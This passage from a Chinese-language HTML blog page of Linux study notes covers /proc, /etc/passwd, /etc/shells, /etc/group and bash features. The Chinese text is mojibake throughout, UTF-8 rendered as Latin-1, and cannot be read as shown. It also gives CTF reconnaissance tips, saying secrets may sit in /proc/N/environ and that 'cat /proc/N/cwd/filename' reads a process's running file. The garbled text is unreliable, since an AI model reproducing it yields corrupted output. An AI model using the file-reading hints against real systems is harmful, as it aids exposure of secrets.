¸çš„ä¸€ä¸ªå¾ˆå¤§çš„å˜åŒ–ã€‚è¯¥ç›®å½•ä¸‹å®‰è£…äº†2.6å†…æ ¸ä¸­æ–°å‡ºç°çš„ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿsysfs</p><h5 id="tmp"><a href="#tmp" class="headerlink" title="&#x2F;tmp"></a>&#x2F;tmp</h5><p>è¿™ä¸ªç›®å½•åªç”¨æ¥å­˜æ”¾ä¸€äº›<strong>ä¸´æ—¶æ–‡ä»¶</strong>çš„ã€‚</p><h5 id="usr"><a href="#usr" class="headerlink" title="&#x2F;usr"></a>&#x2F;usr</h5><p>ç”¨æˆ·çš„å¾ˆå¤šåº”ç”¨ç¨‹åºå’Œæ–‡ä»¶éƒ½æ”¾åœ¨è¿™ä¸ªç›®å½•ä¸‹ï¼Œç±»ä¼¼äºWindowsä¸‹çš„<strong>program files</strong>ç›®å½•ã€‚</p><h6 id="usr-bin"><a href="#usr-bin" class="headerlink" title="&#x2F;usr&#x2F;bin"></a>&#x2F;usr&#x2F;bin</h6><p>ç³»ç»Ÿç”¨æˆ·ä½¿ç”¨çš„<strong>åº”ç”¨ç¨‹åº</strong></p><p>&#x2F;usr&#x2F;binå­˜æ”¾ä¸€äº›ç”¨æˆ·å‘½ä»¤ã€‚</p><p><strong>æ˜¯ä½ åœ¨åæœŸå®‰è£…çš„ä¸€äº›è½¯ä»¶çš„è¿è¡Œè„šæœ¬</strong>ã€‚ä¸»è¦æ”¾ç½®ä¸€äº›åº”ç”¨è½¯ä½“å·¥å…·çš„å¿…å¤‡æ‰§è¡Œæ¡£ä¾‹å¦‚c++ã€g++ã€gccã€chdrvã€diffã€digã€duã€ejectã€elmã€freeã€gnome_ã€ gzipã€htpasswdã€kfmã€ktopã€lastã€lessã€localeã€m4ã€makeã€manã€mcopyã€ncftpã€ newaliasesã€nslookup passwdã€quotaã€smb_ã€wgetç­‰ã€‚</p><h6 id="usr-sbin"><a href="#usr-sbin" class="headerlink" title="&#x2F;usr&#x2F;sbin"></a>&#x2F;usr&#x2F;sbin</h6><p>è¶…çº§ç”¨æˆ·ä½¿ç”¨çš„æ¯”è¾ƒé«˜çº§çš„<strong>ç®¡ç†å‘˜ç¨‹åºå’Œç³»ç»Ÿå®ˆæŠ¤ç³»ç»Ÿ</strong>ã€‚ &#x2F;usr&#x2F;sbinå­˜æ”¾çš„ä¸€äº›éå¿…é¡»çš„ç³»ç»Ÿå‘½ä»¤</p><p>æ”¾ç½®ä¸€äº›ç”¨æˆ·å®‰è£…çš„ç³»ç»Ÿç®¡ç†çš„å¿…å¤‡ç¨‹å¼ä¾‹å¦‚:dhcpdã€httpdã€imapã€in.*dã€inetdã€lpdã€namedã€netconfigã€nmbdã€sambaã€sendmailã€squidã€swapã€tcpdã€tcpdumpç­‰ã€‚</p><h6 id="usr-src"><a href="#usr-src" class="headerlink" title="&#x2F;usr&#x2F;src"></a>&#x2F;usr&#x2F;src</h6><p><strong>å†…æ ¸æºç </strong>é»˜è®¤çš„æ”¾ç½®ä½ç½®</p><h5 id="var"><a href="#var" class="headerlink" title="&#x2F;var ***"></a>&#x2F;var ***</h5><p>è¿™ä¸ªç›®å½•ä¸­å­˜æ”¾ç€åœ¨ä¸æ–­æ‰©å……ç€çš„ä¸œè¥¿ï¼Œæˆ‘ä»¬ä¹ æƒ¯å°†é‚£äº›<strong>ç»å¸¸è¢«ä¿®æ”¹</strong>çš„ç›®å½•æ”¾åœ¨è¿™ä¸ªç›®å½•ä¸‹ã€‚åŒ…æ‹¬å„ç§<strong>æ—¥å¿—æ–‡ä»¶</strong></p><h3 id="é‡è¦ç›®å½•"><a href="#é‡è¦ç›®å½•" class="headerlink" title="é‡è¦ç›®å½•"></a>é‡è¦ç›®å½•</h3><h4 id="proc-1"><a href="#proc-1" class="headerlink" title="&#x2F;proc"></a>&#x2F;proc</h4><h5 id="æ–‡ä»¶ç³»ç»Ÿ"><a href="#æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="æ–‡ä»¶ç³»ç»Ÿ"></a>æ–‡ä»¶ç³»ç»Ÿ</h5><p>ä¸€ç§æ–‡ä»¶ç³»ç»Ÿï¼Œä¸€ç§<strong>ä¼ªæ–‡ä»¶</strong>ç³»ç»Ÿï¼ˆä¹Ÿå³è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼‰ä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒåªå­˜åœ¨å†…å­˜å½“ä¸­ï¼Œè€Œä¸å ç”¨å¤–å­˜ç©ºé—´ã€‚å®ƒä»¥æ–‡ä»¶ç³»ç»Ÿçš„æ–¹å¼ä¸ºè®¿é—®ç³»ç»Ÿå†…æ ¸æ•°æ®çš„æ“ä½œæä¾›æ¥å£ã€‚</p><p>ç”±äºç³»ç»Ÿçš„ä¿¡æ¯ï¼Œå¦‚è¿›ç¨‹ï¼Œæ˜¯åŠ¨æ€æ”¹å˜çš„ï¼Œæ‰€ä»¥ç”¨æˆ·æˆ–åº”ç”¨ç¨‹åºè¯»å–procæ–‡ä»¶æ—¶ï¼Œprocæ–‡ä»¶ç³»ç»Ÿæ˜¯åŠ¨æ€ä»ç³»ç»Ÿå†…æ ¸è¯»å‡ºæ‰€éœ€ä¿¡æ¯å¹¶æäº¤çš„</p><p>ç”¨æˆ·å¯ä»¥é€šè¿‡è¿™äº›æ–‡ä»¶æŸ¥çœ‹æœ‰å…³<strong>ç³»ç»Ÿç¡¬ä»¶</strong>åŠå½“å‰æ­£åœ¨<strong>è¿è¡Œè¿›ç¨‹</strong>çš„ä¿¡æ¯ï¼Œç”šè‡³å¯ä»¥é€šè¿‡æ›´æ”¹å…¶ä¸­æŸäº›æ–‡ä»¶æ¥æ”¹å˜<strong>å†…æ ¸</strong>çš„è¿è¡ŒçŠ¶æ€ã€‚</p><p>è¿˜æœ‰çš„æ˜¯ä¸€äº›ä»¥æ•°å­—å‘½åçš„ç›®å½•ï¼Œå®ƒä»¬æ˜¯<strong>è¿›ç¨‹ç›®å½•</strong>(ä¸€ä¸ªç›®å½•å°±æ˜¯ä¸€ä¸ªè¿›ç¨‹)ã€‚ç³»ç»Ÿä¸­å½“å‰è¿è¡Œçš„æ¯ä¸€ä¸ªè¿›ç¨‹éƒ½æœ‰å¯¹åº”çš„ä¸€ä¸ªç›®å½•åœ¨&#x2F;procä¸‹ï¼Œä»¥è¿›ç¨‹çš„ PIDå·ä¸ºç›®å½•åï¼Œå®ƒä»¬æ˜¯<strong>è¯»å–è¿›ç¨‹ä¿¡æ¯çš„æ¥å£</strong>ã€‚è€Œ<strong>self</strong>ç›®å½•åˆ™æ˜¯<strong>è¯»å–è¿›ç¨‹æœ¬èº«</strong>çš„ä¿¡æ¯æ¥å£ï¼Œæ˜¯ä¸€ä¸ªlinkã€‚</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026202116575-1024x150.png" style="zoom: 80%;" /><h5 id="å„ç§ç›®å½•"><a href="#å„ç§ç›®å½•" class="headerlink" title="å„ç§ç›®å½•"></a>å„ç§ç›®å½•</h5><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026202241887-1024x78.png"></p><h6 id="proc-cmdline"><a href="#proc-cmdline" class="headerlink" title="&#x2F;proc&#x2F;cmdline"></a>&#x2F;proc&#x2F;<strong>cmdline</strong></h6><p>è½½å…¥ kernel æ—¶æ‰€ä¸‹è¾¾çš„ç›¸å…³æŒ‡ä»¤ä¸å‚æ•°ï¼æŸ¥é˜…æ­¤æ–‡ä»¶ï¼Œå¯äº†è§£æŒ‡ä»¤æ˜¯å¦‚ä½•å¯åŠ¨çš„ï¼</p><p>ä¾‹å¦‚ï¼špythonloader.pyc ä¸­é—´ç©ºæ ¼è¢«çœç•¥æ‰äº†ï¼Œç”¨readlineèƒ½æŸ¥çœ‹å®Œæ•´çš„ã€‚ æ­¤è¯­å¥æ„æ€æ˜¯ç”¨pythonè¿è¡Œloader.pyc</p><h6 id="proc-N-environ"><a href="#proc-N-environ" class="headerlink" title="&#x2F;proc&#x2F;N&#x2F;environ"></a>&#x2F;proc&#x2F;N&#x2F;environ</h6><p>è¿›ç¨‹ç¯å¢ƒå˜é‡åˆ—è¡¨ï¼ˆ<strong>æœ‰äº›æ—¶å€™ä¸€äº›CTFé¢˜ä¼šå§é‡è¦å˜é‡æˆ–è€…å€¼å­˜æ”¾åœ¨è¿™ä¸ªç›®å½•ä¸‹</strong>ï¼‰</p><h6 id="proc-N-exe"><a href="#proc-N-exe" class="headerlink" title="&#x2F;proc&#x2F;N&#x2F;exe"></a>&#x2F;proc&#x2F;N&#x2F;<strong>exe</strong></h6><p>exe æ˜¯ä¸€ä¸ªæŒ‡å‘å¯åŠ¨å½“å‰è¿›ç¨‹çš„<strong>å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆå®Œæ•´è·¯å¾„ï¼‰</strong>çš„ç¬¦å·é“¾æ¥ã€‚é€šè¿‡exeæ–‡ä»¶æˆ‘ä»¬å¯ä»¥è·å¾—æŒ‡å®šè¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶çš„å®Œæ•´è·¯å¾„</p><h6 id="proc-maps"><a href="#proc-maps" class="headerlink" title="&#x2F;proc&#x2F;maps"></a>&#x2F;proc&#x2F;maps</h6><p>å½“å‰è¿›ç¨‹å…³è”åˆ°çš„æ¯ä¸ª<strong>å¯æ‰§è¡Œæ–‡ä»¶å’Œåº“æ–‡ä»¶</strong>åœ¨å†…å­˜ä¸­çš„æ˜ å°„åŒºåŸŸåŠå…¶è®¿é—®æƒé™æ‰€ç»„æˆçš„åˆ—è¡¨</p><p>æ‰¾åˆ°&#x2F;appåçš„æ–‡ä»¶ï¼šapp.cpython-39-x86_64-linux-gnu.so</p><p>ç‰¹æ®Šæ ¼å¼ï¼š .soç»“å°¾ï¼Œæœ‰<strong>ç‰ˆæœ¬å·ä¿¡æ¯</strong></p><h6 id="proc-N-fd"><a href="#proc-N-fd" class="headerlink" title="&#x2F;proc&#x2F;N&#x2F;fd"></a>&#x2F;proc&#x2F;N&#x2F;fd</h6><p>åŒ…å«è¿›ç¨‹ç›¸å…³çš„æ‰€æœ‰çš„<strong>æ–‡ä»¶æè¿°ç¬¦</strong></p><h6 id="proc-cpuinfo"><a href="#proc-cpuinfo" class="headerlink" title="&#x2F;proc&#x2F;cpuinfo"></a>&#x2F;proc&#x2F;cpuinfo</h6><p>æœ¬æœºçš„ <strong>CPU çš„ç›¸å…³ä¿¡æ¯</strong>ï¼ŒåŒ…å«<strong>é¢‘ç‡</strong>ã€<strong>ç±»å‹</strong>ä¸<strong>è¿ç®—åŠŸèƒ½</strong>ç­‰</p><h6 id="proc-modules"><a href="#proc-modules" class="headerlink" title="&#x2F;proc&#x2F;modules"></a>&#x2F;proc&#x2F;modules</h6><p>ç›®å‰æˆ‘ä»¬çš„ Linux å·²ç»è½½å…¥çš„<strong>æ¨¡å—åˆ—è¡¨</strong>ï¼Œä¹Ÿå¯ä»¥æƒ³æˆæ˜¯é©±åŠ¨ç¨‹åºå•¦ï¼</p><h6 id="proc-fb"><a href="#proc-fb" class="headerlink" title="&#x2F;proc&#x2F;fb"></a>&#x2F;proc&#x2F;fb</h6><p>å¸§ç¼“å†²è®¾å¤‡åˆ—è¡¨ï¼ŒåŒ…æ‹¬æ•°é‡å’Œæ§åˆ¶å®ƒçš„é©±åŠ¨</p><h6 id="proc-stat"><a href="#proc-stat" class="headerlink" title="&#x2F;proc&#x2F;stat"></a>&#x2F;proc&#x2F;stat</h6><p>ç³»ç»Ÿçš„ä¸€äº›çŠ¶æ€ä¿¡æ¯ï¼Œæ‰€æœ‰çš„CPUæ´»åŠ¨ä¿¡æ¯</p><h6 id="proc-N-cwd"><a href="#proc-N-cwd" class="headerlink" title="&#x2F;proc&#x2F;N&#x2F;cwd"></a>&#x2F;proc&#x2F;N&#x2F;cwd</h6><p>cwd æ–‡ä»¶æ˜¯ä¸€ä¸ªæŒ‡å‘å½“å‰è¿›ç¨‹è¿è¡Œç›®å½•çš„ç¬¦å·é“¾æ¥ã€‚å¯ä»¥é€šè¿‡æŸ¥çœ‹cwdæ–‡ä»¶è·å–ç›®æ ‡æŒ‡å®šè¿›ç¨‹ç¯å¢ƒçš„è¿è¡Œç›®å½•</p><p>e.g: app.cpython-39-x86_64-linux-gnu.so</p><p><strong>cat &#x2F;proc&#x2F;N&#x2F;cwd&#x2F;filename</strong></p><p>æ‰“å¼€è¿›ç¨‹å½“å‰<strong>è¿è¡Œæ–‡ä»¶</strong></p><h4 id="etc-1"><a href="#etc-1" class="headerlink" title="&#x2F;etc"></a>&#x2F;etc</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â #è¿™ä¸ªç›®å½•ç”¨æ¥å­˜æ”¾æ‰€æœ‰çš„ç³»ç»Ÿç®¡ç†æ‰€éœ€è¦çš„é…ç½®æ–‡ä»¶å’Œå­ç›®å½•</span><br></pre></td></tr></table></figure><h6 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="&#x2F;etc&#x2F;passwd"></a>&#x2F;etc&#x2F;passwd</h6><p>ç”¨æˆ·æ•°æ®åº“ï¼Œå…¶ä¸­çš„åŸŸç»™å‡ºäº†ç”¨æˆ·åã€çœŸå®å§“åã€å®¶ç›®å½•ã€åŠ å¯†çš„å£ä»¤å’Œç”¨æˆ·çš„å…¶ä»–ä¿¡æ¯.</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026202509378.png" style="zoom:67%;" /><p>æ¯è¡Œç”¨æˆ·ä¿¡æ¯éƒ½ä»¥**â€ï¼šâ€**ä½œä¸ºåˆ†éš”ç¬¦ï¼Œåˆ’åˆ†ä¸º7ä¸ªå­—æ®µã€‚</p><p>å¦‚ä¸‹å›¾å„ä¸ªå­—æ®µå«ä¹‰ï¼š</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/4b27211904a247f5b42fcb706ddbfb12.jpeg" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Â &quot;x&quot;ï¼šè¡¨ç¤ºæ­¤ç”¨æˆ·è®¾æœ‰å¯†ç ï¼Œä½†ä¸æ˜¯çœŸæ­£çš„å¯†ç ï¼ŒçœŸæ­£çš„å¯†ç ä¿å­˜åœ¨/etc/shadowæ–‡ä»¶ã€‚</span><br><span class="line">Â &#x27;UID&#x27;:UIDä¸º0å°±ä»£è¡¨è¿™ä¸ªè´¦å·æ˜¯ç®¡ç†å‘˜è´¦å·,1-499(ç³»ç»Ÿç”¨æˆ·)500-65535ï¼ˆæ™®é€šç”¨æˆ·ï¼‰</span><br><span class="line">Â &#x27;shell&#x27;:shellæ˜¯Linuxçš„å‘½ä»¤è§£é‡Šå™¨ï¼Œç”¨æˆ·å’ŒLinuxå†…æ ¸ä¹‹é—´æ²Ÿé€šçš„æ¡¥æ¢ã€‚</span><br><span class="line">Â Shellå‘½ä»¤è§£é‡Šå™¨çš„åŠŸèƒ½å°±æ˜¯å°†ç”¨æˆ·è¾“å…¥çš„å‘½ä»¤è½¬æ¢æˆç³»ç»Ÿå¯ä»¥è¯†åˆ«çš„æœºå™¨è¯­è¨€ã€‚</span><br><span class="line">Â é€šå¸¸æƒ…å†µä¸‹ï¼ŒLinuxç³»ç»Ÿé»˜è®¤ä½¿ç”¨çš„å‘½ä»¤è§£é‡Šå™¨æ˜¯/bin/bashï¼Œå½“ç„¶è¿˜æœ‰å…¶ä»–å‘½ä»¤è§£é‡Šå™¨ã€‚</span><br><span class="line">Â (å‘½ä»¤è¡Œè§£é‡Šå™¨æ˜¯ä¸€ä¸ªå•ç‹¬çš„è½¯ä»¶ç¨‹åºï¼Œå®ƒå¯åœ¨ç”¨æˆ·å’Œæ“ä½œç³»ç»Ÿä¹‹é—´æä¾›ç›´æ¥çš„é€šè®¯ã€‚å‘½ä»¤è¡Œè§£é‡Šå™¨æ˜¯è§£é‡Šå™¨çš„ä¸€ç§ï¼Œç”¨äºå¯¹å‘½ä»¤è¡Œè¿›è¡Œè§£é‡Šæ‰§è¡Œã€‚)</span><br><span class="line">Â &#x27;zsh&#x27;:2022æ›´æ–°ä¹‹åkalié‡‡ç”¨çš„shellç‰ˆæœ¬ï¼Œå²ç§°ç»ˆæshellã€‚ï¼ˆzshæ­é…ä¸Š&quot;oh my zsh&quot;çœŸçš„å¥½ç”¨åˆ°çˆ†ï¼‰</span><br></pre></td></tr></table></figure><h6 id="etc-shells"><a href="#etc-shells" class="headerlink" title="&#x2F;etc&#x2F;shells"></a>&#x2F;etc&#x2F;shells</h6><p>åˆ—å‡ºå¯ä¿¡ä»»çš„<strong>shell.chsh å‘½ä»¤</strong>å…è®¸ç”¨æˆ·åœ¨æœ¬æ–‡ä»¶æŒ‡å®šèŒƒå›´å†…æ”¹å˜ç™»å½•shell.æä¾›ä¸€å°æœºå™¨FTPæœåŠ¡çš„æœåŠ¡è¿›ç¨‹ftpdæ£€æŸ¥ç”¨æˆ·shellæ˜¯å¦åˆ—åœ¨ &#x2F;etc&#x2F;shells æ–‡ä»¶ä¸­ï¼Œå¦‚æœä¸æ˜¯å°†ä¸å…è®¸è¯¥ç”¨æˆ·ç™»å½•.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Â åŠŸèƒ½ï¼šè¿™ä¸ªæ–‡ä»¶è®°å½•äº†ä½ å½“å‰Linuxç³»ç»Ÿä¸­æ‰€æ”¯æŒçš„shellç‰ˆæœ¬ï¼ˆåªæ˜¯å…¶ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œè¿˜æœ‰å…¶ä»–shellåœ¨åˆ«çš„è·¯å¾„ä¸‹ï¼‰</span><br><span class="line">Â ä½œç”¨ï¼šç³»ç»Ÿä¸Šåˆæ³•çš„shelléƒ½è¦å†™å…¥åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚å½“ç³»ç»Ÿè¿›è¡ŒæŸäº›æœåŠ¡æ—¶å°±èƒ½å¤Ÿä¾æ®è¿™ä¸ªæ–‡ä»¶çš„è®°å½•æ¥è¿›è¡Œæ“ä½œ</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026225108937-1024x284.png" style="zoom:67%;" /><p>ï¼ˆç”¨çš„centosæ‰€ä»¥æ²¡æœ‰zshï¼‰</p><p>ä¸åŒçš„ç”¨æˆ·ç™»å½•ç³»ç»Ÿæ—¶,ç³»ç»Ÿä¼šç»™ä¸åŒçš„é»˜è®¤shellç‰ˆæœ¬ã€‚å…·ä½“æ˜¯ä»€ä¹ˆå¯ä»¥åœ¨**&#x2F;etc&#x2F;passwd**ä¸­çœ‹shellä¸€æ </p><p><strong>shell</strong></p><p>Shellæ˜¯Linux&#x2F;Unixçš„ä¸€ä¸ªå¤–å£³ï¼Œä½ ç†è§£æˆè¡£æœä¹Ÿè¡Œã€‚å®ƒè´Ÿè´£<strong>å¤–ç•Œä¸Linuxå†…æ ¸çš„äº¤äº’</strong>ï¼Œæ¥æ”¶ç”¨æˆ·æˆ–å…¶ä»–åº”ç”¨ç¨‹åºçš„å‘½ä»¤ï¼Œç„¶åæŠŠè¿™äº›å‘½ä»¤è½¬åŒ–æˆå†…æ ¸èƒ½ç†è§£çš„è¯­è¨€ï¼Œä¼ ç»™å†…æ ¸ï¼Œå†…æ ¸æ˜¯çœŸæ­£å¹²æ´»çš„ï¼Œå¹²å®Œä¹‹åå†æŠŠç»“æœè¿”å›ç”¨æˆ·æˆ–åº”ç”¨ç¨‹åºã€‚</p><p><strong>shellç‰ˆæœ¬</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Â shï¼ˆBourne shellï¼‰ï¼šç¬¬ä¸€ä¸ªæµè¡Œçš„shellç”±Steven Bourneå‘å±•å‡ºæ¥çš„</span><br><span class="line">Â cshï¼ˆC shellï¼‰ï¼šç”±ä¼¯å…‹åˆ©å¤§å­¦çš„Bill Joyè®¾è®¡ä¾é™„äºBSDç‰ˆçš„UNIXç³»ç»Ÿä¸­çš„shellï¼Œè¿™ä¸ªè¯­è¨€æœ‰ç‚¹ç±»ä¼¼Cè¯­è¨€ï¼Œæ‰€ä»¥ç®€ç§°csh</span><br><span class="line">Â tcshï¼šæ•´åˆäº†cshï¼Œæä¾›äº†æ›´å¤šçš„åŠŸèƒ½</span><br><span class="line">Â bashï¼šå½“å‰Linuxç‰ˆæœ¬çš„shellã€‚è¿™ä¸ªshellæ˜¯Bourne shellçš„å¢å¼ºç‰ˆæœ¬ï¼Œä¹Ÿæ˜¯åŸºäºGNUçš„æ¶æ„ä¸‹çš„å‘å±•</span><br><span class="line">Â å•†ä¸šä¸Šç”¨çš„K shellï¼Œè¿˜æœ‰TCSHç­‰</span><br></pre></td></tr></table></figure><p><strong>Bash shellçš„åŠŸèƒ½</strong>(dd)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â æ¦‚å¿µï¼šbashæ˜¯Linuxé»˜è®¤çš„shellï¼Œä¸»è¦å…¼å®¹ä¸sh</span><br></pre></td></tr></table></figure><p>åŠŸèƒ½â‘ ï¼šå†å²å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Â ~/.bash_historyæ–‡ä»¶ï¼šbashè®°å½•äº†ä½ æ›¾ç»ä½¿ç”¨è¿‡çš„å‘½ä»¤ï¼Œä¸åŒçš„ç”¨æˆ·ä½¿ç”¨è¿‡çš„å†å²å‘½ä»¤ä¹Ÿä¸åŒï¼Œè¿™äº›å†å²å‘½ä»¤éƒ½è®°å½•åœ¨è‡ªå·±å®¶ç›®å½•ä¸‹çš„.bash_historyæ–‡ä»¶ä¸­</span><br><span class="line">Â ~/.bash_historyè®°å½•çš„æ˜¯ä½ ä¸Šä¸€æ¬¡ç™»å½•ç³»ç»Ÿæ‰€æ‰§è¡Œè¿‡çš„å‘½ä»¤ï¼Œè€Œè‡³äºè¿™ä¸€æ¬¡æ‰€æ‰§è¡Œè¿‡çš„å‘½ä»¤éƒ½è¢«ç¼“å†²åœ¨å†…å­˜ä¸­ï¼Œå½“ä½ ç³»ç»Ÿå…³æœº/é‡å¯åæ‰ä¼šæ›´æ–°åˆ°~/.bash_historyæ–‡ä»¶ä¸­</span><br></pre></td></tr></table></figure><p>åŠŸèƒ½â‘¡ï¼šå‘½ä»¤ä¸æ–‡ä»¶è¡¥é½åŠŸèƒ½ï¼ˆtabé”®ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Â Linuxç³»ç»Ÿä¸‹tabé”®è¡¥é½åŠŸèƒ½ååˆ†å¥½ç”¨</span><br><span class="line">Â è‹¥å®‰è£…äº†bash-completionè½¯ä»¶ï¼Œåˆ™åœ¨æŸäº›å‘½ä»¤åé¢ä½¿ç”¨TabæŒ‰é”®æ—¶ï¼Œå¯ä»¥è¿›è¡Œé€‰é¡¹ä¸å‚æ•°è¡¥é½çš„åŠŸèƒ½</span><br></pre></td></tr></table></figure><p>åŠŸèƒ½â‘¢ï¼šå‘½ä»¤åˆ«åè®¾ç½®åŠŸèƒ½ï¼ˆaliasï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â aliaså‘½ä»¤ï¼šè¿™ä¸ªå‘½ä»¤å¯ä»¥ç»™å‘½ä»¤å–åˆ«å</span><br></pre></td></tr></table></figure><p>åŠŸèƒ½â‘£ï¼šä»»åŠ¡ç®¡ç†ã€å‰å°ã€åå°æ§åˆ¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Â ä»»åŠ¡ç®¡ç†çš„ç”¨é€”å¹¿æ³›ï¼Œå¯ä»¥å°†äººç‰©ä¸¢åˆ°åå°è¿è¡Œ</span><br><span class="line">Â ä»»åŠ¡å‰ã€åå°çš„æ§åˆ¶å¯ä»¥è®©ä»»åŠ¡è¿›è¡Œçš„æ›´ä¸ºé¡ºåˆ©</span><br></pre></td></tr></table></figure><p>åŠŸèƒ½â‘¤ï¼šç¨‹åºåŒ–è„šæœ¬ï¼ˆshell scriptsï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Â ä»å‰DOSå¹´ä»£éœ€è¦å°†ä¸€å †å‘½ä»¤å†™åœ¨ä¸€èµ·æ¥å½¢æˆæ‰¹å¤„ç†æ–‡ä»¶ï¼ˆç¼–ç¨‹è¯­è¨€ä¹¦å†™ï¼‰</span><br><span class="line">Â è€Œåœ¨Linuxç³»ç»Ÿä¸­ï¼Œå¯ä»¥é€šè¿‡shellæä¾›çš„ç¯å¢ƒå˜é‡ä»¥åŠç›¸å…³å‘½ä»¤æ¥è®¾è®¡shellè„šæœ¬ï¼Œå°±èƒ½å¤Ÿå®ç°ç›¸åº”çš„åŠŸèƒ½</span><br></pre></td></tr></table></figure><p>åŠŸèƒ½â‘¥ï¼šé€šé…ç¬¦*</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â Linuxä½¿ç”¨*é€šé…ç¬¦ï¼Œä½¿ç”¨æ–¹ä¾¿</span><br></pre></td></tr></table></figure><h6 id="etc-group"><a href="#etc-group" class="headerlink" title="&#x2F;etc&#x2F;group"></a>&#x2F;etc&#x2F;group</h6><p>ã€€ã€€ç±»ä¼¼&#x2F;etc&#x2F;passwd ï¼Œä½†è¯´æ˜çš„ä¸æ˜¯ç”¨æˆ·è€Œæ˜¯ç»„.</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026210139910.png" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Â root: Â  x  ï¼š Â  0 Â  Â   ï¼š </span><br><span class="line">Â    Â  Â   Â  Â  Â   Â  Â  Â  Â  Â  </span><br><span class="line">Â ç»„åï¼šç»„å¯†ç ï¼šç»„IDï¼ˆGIDï¼‰ï¼šç»„ä¸­ç”¨æˆ·</span><br></pre></td></tr></table></figure><h6 id="etc-fstab"><a href="#etc-fstab" class="headerlink" title="&#x2F;etc&#x2F;fstab"></a>&#x2F;etc&#x2F;fstab</h6><p>ã€€ã€€å¯åŠ¨æ—¶mount -aå‘½ä»¤(åœ¨&#x2F;etc&#x2F;rc æˆ–ç­‰æ•ˆçš„å¯åŠ¨æ–‡ä»¶ä¸­)è‡ªåŠ¨mountçš„æ–‡ä»¶ç³»ç»Ÿåˆ—è¡¨.<a href="http://lib.csdn.net/base/linux">linux</a>ä¸‹ï¼Œä¹ŸåŒ…æ‹¬ç”¨swapon -aå¯ç”¨çš„swapåŒºçš„ä¿¡æ¯.</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026210033960-1024x101.png"></p><h6 id="etc-rc-d"><a href="#etc-rc-d" class="headerlink" title="&#x2F;etc&#x2F;rc.d"></a>&#x2F;etc&#x2F;rc.d</h6><p><strong>è¿›ç¨‹</strong></p><p>è¦å¼„æ‡‚è¿™ä¸ªæ–‡ä»¶é¦–å…ˆè¦çŸ¥é“æ“ä½œç³»ç»Ÿä¸­è¿›ç¨‹çš„æ„æ€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Â #ç‹­ä¹‰å®šä¹‰ï¼š</span><br><span class="line">Â è¿›ç¨‹æ˜¯æ­£åœ¨è¿è¡Œçš„ç¨‹åºçš„å®ä¾‹ï¼ˆan instance of a computer program that is being executedï¼‰ã€‚</span><br><span class="line">Â #å¹¿ä¹‰å®šä¹‰ï¼š</span><br><span class="line">Â è¿›ç¨‹æ˜¯ä¸€ä¸ªå…·æœ‰ä¸€å®šç‹¬ç«‹åŠŸèƒ½çš„ç¨‹åºå…³äºæŸä¸ªæ•°æ®é›†åˆçš„ä¸€æ¬¡è¿è¡Œæ´»åŠ¨ã€‚å®ƒæ˜¯æ“ä½œç³»ç»ŸåŠ¨æ€æ‰§è¡Œçš„åŸºæœ¬å•å…ƒï¼Œåœ¨ä¼ ç»Ÿçš„æ“ä½œç³»ç»Ÿä¸­ï¼Œè¿›ç¨‹æ—¢æ˜¯åŸºæœ¬çš„åˆ†é…å•å…ƒï¼Œä¹Ÿæ˜¯åŸºæœ¬çš„æ‰§è¡Œå•å…ƒã€‚</span><br><span class="line">Â #è¿›ç¨‹çš„æ¦‚å¿µä¸»è¦æœ‰ä¸¤ç‚¹ï¼š</span><br><span class="line">Â 